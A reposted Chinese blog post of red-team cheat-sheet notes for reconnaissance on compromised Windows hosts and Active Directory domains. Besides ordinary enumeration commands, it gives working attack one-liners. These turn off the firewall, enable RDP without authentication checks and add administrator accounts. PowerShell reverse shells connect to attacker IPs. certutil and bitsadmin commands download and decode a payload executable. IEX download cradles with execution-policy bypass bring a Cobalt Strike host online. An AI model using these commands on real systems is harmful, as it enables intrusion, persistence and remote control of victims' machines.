> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zkrJOT3etYLBU2WB80Xa-g)

内容来源：

https://const27.com/2021/06/28/

**一、正文**
========

前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学

**二、本机信息收集**
------------

### **1、查询网络配置信息**

ipconfig /all

### **2、查询本机的服务信息**

wmic service list brief

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b8AKBibLwwUytFzPbXT4d4bhfBQHYzSS4ZctNrtVEj3mvrJeocB0nMFvA/640?wx_fmt=png)

### **3、查询系统信息**

systeminfo

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b8MZlUE3IZLnbcXjQYCCCkicnKu015Lr1fuDpTzCN7Puclz4A6dlsw80w/640?wx_fmt=png)

### **4、查询进程列表**

tasklist / wmic process list brief

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b8GaAXtESQoJYI2W919fNEuTfjoN5jJibSsiakzlcAKnpbVdESYhU7zGTg/640?wx_fmt=png)

### **5、查看计划任务**

schtasks /query /fo LIST /v 列出计划任务详细信息

### **6、查看主机开机时间**

net statistics workstation

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b80HNy4qo2TKNuOicogOjQ5MmVk77j47xYslZRKPsr4tlynZuZamSLO7w/640?wx_fmt=png)

### **7、用户相关**

net user 查看所有用户  
net localgroup administrators 获取本地管理员信息

### **8、查看端口列表**

netstat -ano

### **9、查看已打补丁**

wmic qfe get Caption,Description,HotFixID,InstalledOn

### **10、查看共享列表**

net share 查看本机共享列表和可访问的域共享列表  
wmic share get name,path,status 查找共享列表

### **11、路由表和 arp 高速缓存表**

route print 路由表  
arp -a arp 高速缓存表

### **12、防火墙**

netsh firewall set opmode disable 关闭防火墙 (Windows Server 2003 以前的版本)

netsh advfirewall set allprofiles state off 关闭防火墙 (Windows Server 2003 以后的版本)

netsh firewall show config 查看防火墙配置  
如果上面的命令被弃用，则使用  
netsh advfirewall firewall show rule name=all

根据参考，可以使用这个 wmic 一键获取本机信息 http://www.fuzzysecurity.com/scripts/files/wmic_info.rar

**三、域信息收集**
-----------

### **1、权限查看**

whoami /all 查看自己的详细权限  
net user xxx /domain 查看域内指定用户的权限

### **2、判断是否存在域**

.net time /domain 若出现以下情况则不存在域

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b8ZhvSZtKu6uveu7lFJW39xSZvlUWLI9ibNbBFgdvlBlOqqyHk8W5EibTg/640?wx_fmt=png)

若是报错：发生系统错误 5，则存在域，但该用户不是域用户

若是以下情况则说明存在域且已经在域中

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b8ribibzxyUxNuibN9iajOYpicvHQmkrkXFb2gmWpr7hu3CIC3uvtniaNhDicaQ/640?wx_fmt=png)

### **3、查看域的名字**

net config workstation

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b8xDic7ibvNia2ticKAIYbjbzAvycAv3cMyHTL0zvRxZPLGX6WreCpOU6TRA/640?wx_fmt=png)

nslookup -type=srv _ldap._tcp

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b8GghuHbgUQhUa9aWL2tRcGQQWaLcCE5WbnovPlGkExutwGrQnccWxOw/640?wx_fmt=png)

这个很爽，域控主机名和 IP 一块弄出来了

### **4、探测域内存活主机**

（1）. 使用工具 nbtscan http://www.unixwiz.net/tools/nbtscan.html

（2）. 查看 arp 高速缓存表

arp -a

![](https://mmbiz.qpic.cn/mmbiz_png/bhLFK4g0KDYSW5qrRzr8b9wQ9otor0b8EmU44MENmCA8pxSbPjU3uSGziahlYB3JfJxbmTbYbYvnv6bMQnpOceQ/640?wx_fmt=png)

（3）.ICMP 协议探测（逐个 ping）

这个贼慢，但是不用下载其他应用

<table><tbody><tr><td><pre class="hljs perl">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr "TTL"</pre></td></tr></tbody></table>

（4）.nmap 直接开扫

（5）.meterpreter 会话中执行 run windows/gather/enum_ad_computers

### **5、扫描域内开放端口**

（1）.nmap

nmap 192.168.1.0/24

（2）. 工具 S 扫描器

（3）. 自写脚本

<table><tbody><tr><td><pre class="hljs python">#python3 慢的一批
import socket
 
def get_ip_status(ip,port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.connect((ip,port))
        print('{0} port {1} is open'.format(ip, port))
    except Exception as err:
        print('{0} port {1} is not open'.format(ip,port))
    finally:
        server.close()
 
if __name__ == '__main__':
    host = '172.16.0.198'
    for port in range(20,100):
        get_ip_status(host,port)</pre></td></tr></tbody></table>

### **6、域内基本信息**

net group “domain computers” /domain 查询所有域成员计算机列表  
net view /domain:HACHE 查询域内所有主机  
net accounts /domain 获取域密码信息  
nltest /domain_trusts 获取域信任信息  
nltest /DCLIST:hacke 查看域控制器机器名  
Nslookup -type=SRV_ldap._tcp 查看域控制器的主机名

### **7、域用户信息收集**

net user /domain 向域控制器查询域内用户列表  
wmic useraccount get /all 获取域内用户详细信息  
net localgroup administrators 查询本地管理员用户  
net group “domain admins” /domain 查询域管理员用户  
net group “Enterprise admins” /domain 查询管理员用户组

### **8、本机 wmic 查杀软**

`WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`  
or

WMIC /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe

### **9、开 3389**

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

### **10、用户增删改查**

net user username password /add 加用户

net localgroup administrators username /add 添加 XX 到管理员账户

### **11、一些喜欢用的**

Windows 反弹 shell

<table><tbody><tr><td><pre class="hljs cs">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666</pre></td></tr></tbody></table>

wmic 查杀软

<table><tbody><tr><td><pre class="hljs properties">WMIC /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe

WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</pre></td></tr></tbody></table>

开 3389

<table><tbody><tr><td><pre class="hljs sql">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1

wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 0</pre></td></tr></tbody></table>

常见杀软进程名  
https://blog.csdn.net/weixin_39997829/article/details/92666552

cmd 下载

<table><tbody><tr><td><pre class="hljs yaml">bitsadmin /transfer n http://www.xx.com/code.jpg c:\users\sdyp\desktop\ff.jpg

C:\Temp&gt;certutil.exe -urlcache -split -f "https://hackers.home/badcontent.txt" bad.txt
C:\Temp&gt;certutil.exe -decode bad.txt bad.exe</pre></td></tr></tbody></table>

获取盘符

<table><tbody><tr><td><pre class="hljs cs">wmic logicaldisk where drivetype=3 get deviceid</pre></td></tr></tbody></table>

### **12、ps cs 上线**

<table><tbody><tr><td><pre class="hljs bash">powershell.exe -c IEX((new-object net.webclient).downloadstring('http://xxx/a.ps1'))

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

powershell -exec bypass -f \\webdavserver\folder\payload.ps1   (smb)</pre></td></tr></tbody></table>

**版权申明：内容来源网络，版权归原创者所有。除非无法确认，都会标明作者及出处，如有侵权烦请告知，我们会立即删除并致歉。谢谢!**

公众号